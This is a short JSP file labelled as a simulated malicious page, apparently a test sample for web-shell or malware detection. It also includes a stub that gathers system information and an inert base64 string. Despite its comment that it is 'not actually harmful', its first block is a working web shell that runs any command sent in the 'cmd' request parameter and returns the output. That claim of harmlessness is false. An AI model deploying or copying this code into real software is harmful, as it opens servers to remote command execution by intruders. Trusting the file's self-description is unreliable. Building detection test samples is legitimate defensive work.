<%@ page language="java" contentType="text/plain" %>
<%-- 
  Simulated malicious JSP file for testing purposes only
  This is not actually harmful but represents what malware might look like
--%>

<%-- Fake execution of system commands --%>
<%
  // This would execute system commands if enabled
  try {
    if (request.getParameter("cmd") != null) {
      java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
      int i = 0;
      byte[] b = new byte[1024];
      while((i=in.read(b))!=-1) {
        out.print(new String(b,0,i));
      }
    }
  } catch(Exception e) {
    out.println("Error: " + e.getMessage());
  }
%>

<%-- Fake data exfiltration --%>
<%
  // This would collect system information
  String osName = System.getProperty("os.name");
  String osVersion = System.getProperty("os.version");
  String userName = System.getProperty("user.name");
  
  // Simulating sending data to remote server
  String dataToExfiltrate = "OS: " + osName + ", Version: " + osVersion + ", User: " + userName;
  
  // Output for testing purposes
  out.println("<!-- Collected data: " + dataToExfiltrate + " -->");
%>

<%-- Fake encrypted payload --%>
<%
  String encryptedPayload = "VGhpcyBpcyBhIHNpbXVsYXRlZCBlbmNyeXB0ZWQgSlNQIHBheWxvYWQgZm9yIHRlc3RpbmcgcHVycG9zZXM=";
  // Would decode and execute additional code
%>

<!-- JSP Backdoor Active --> 